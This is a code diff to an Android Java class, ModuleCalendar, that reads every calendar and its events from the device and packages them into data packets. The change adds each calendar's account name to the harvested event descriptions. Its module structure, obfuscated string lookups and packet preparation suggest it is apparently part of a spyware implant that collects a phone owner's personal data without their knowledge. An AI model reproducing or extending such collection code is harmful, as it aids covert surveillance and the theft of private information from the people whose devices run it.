@@ -6,6 +6,7 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.HashSet;
+import java.util.Hashtable;
 import java.util.List;
 
 import android.content.ContentResolver;
@@ -169,7 +170,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 		// v4:
 		// http://stackoverflow.com/questions/10069319/how-to-get-device-calendar-event-list-in-android-device
 
-		List<String> calendars;
+		Hashtable<String, String> calendars;
 		String contentProvider;
 
 		// d_19=content://com.android.calendar
@@ -193,7 +194,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 
 		// For each calendar, display all the events from the previous week to
 		// the end of next week.
-		for (String id : calendars) {
+		for (String id : calendars.keySet()) {
 			int calendar_id = Integer.parseInt(id);
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (calendar): " + calendar_id); //$NON-NLS-1$
@@ -228,19 +229,23 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 
 				final String location = eventCursor.getString(index++);
 				// final String syncAccount = eventCursor.getString(5);
-				String syncAccount = ""; //$NON-NLS-1$
+
 				final String description = eventCursor.getString(index++);
+		
+				String syncAccount = calendars.get(id); //$NON-NLS-1$
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (calendar): Title: " + title + " Begin: " + begin + " End: " + end + " All Day: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
 							+ allDay + " Location: " + location + " SyncAccount:" + syncAccount + " Description: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
 							+ description);
 				}
+				
+				String desc = "account: " + syncAccount + "\n" + description;
 
 				byte[] packet = null;
 				try {
 					// calculate the crc of the contact
-					packet = preparePacket(idEvent, title, description, location, begin, end, rrule, allDay);
+					packet = preparePacket(idEvent, title, desc, location, begin, end, rrule, allDay);
 				} catch (Exception ex) {
 					if (Cfg.EXCEPTION) {
 						Check.log(ex);
@@ -278,7 +283,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 		return needToSerialize;
 	}
 
-	private ArrayList<String> selectCalendars(String contentProvider) {
+	private Hashtable<String, String> selectCalendars(String contentProvider) {
 		try {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (selectCalendars) provider: %s", contentProvider);
@@ -288,7 +293,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 					Messages.getString("d_3"), "account_name", "calendar_displayName", "ownerAccount" }; //$NON-NLS-1$
 			// Uri calendars = Uri.parse("content://calendar/calendars");
 			Uri calendars = Uri.parse(contentProvider + Messages.getString("d_2")); //$NON-NLS-1$
-			ArrayList<String> calendarIds = new ArrayList<String>();
+			Hashtable<String, String> calendarIds = new Hashtable<String, String>();
 			Cursor managedCursor = managedQuery(calendars, projection, null, null, null); //$NON-NLS-1$
 
 			while (managedCursor != null && managedCursor.moveToNext()) {
@@ -302,7 +307,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 							TAG + " (selectCalendars): Id: %s (%s,%s,%s)", _id, account_name, calendar_displayName, ownerAccount); //$NON-NLS-1$
 				}
 
-				calendarIds.add(_id);
+				calendarIds.put(_id, account_name);
 			}
 
 			managedCursor.close();
